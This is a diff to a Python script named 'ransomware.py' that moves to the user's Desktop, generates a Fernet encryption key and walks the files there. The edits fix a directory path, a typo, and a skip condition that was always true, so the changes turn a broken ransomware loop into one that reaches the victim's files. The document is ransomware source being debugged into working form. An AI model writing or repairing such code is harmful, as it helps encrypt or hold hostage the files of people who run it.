@@ -8,12 +8,12 @@ username = getpass.getuser()
 operating = platform.system()
 
 if operating == "linux":
-    os.chdir("~/Desktop")
+    os.chdir(f"/home/{username}/Desktop")
 elif operating == "windows":
     os.chdir(f"C:/Users/{username}/Desktop")
 
 key = Fernet.generate_key()     # create a fernet key
-print(key)      # print it (for saftey backup)
+print(key)      # print it (for safety backup)
 f = Fernet(key)         # generate an item "f"
 with open("key.key", "wb") as keyw:     #create a key file (for decryption backup)
     keyw.write(key)
@@ -22,7 +22,7 @@ files = []          # files list
 
 for file in os.listdir():               # look trough all of the files in the current directory
 
-    if file == "ransomware.py" or "key.key":        #check if the filename is the ransomware script or the key
+    if file == "ransomware.py" or file == "key.key":        #check if the filename is the ransomware script or the key
         continue
                                                     
     if os.path.isdir(file):             # if its a directory skip it
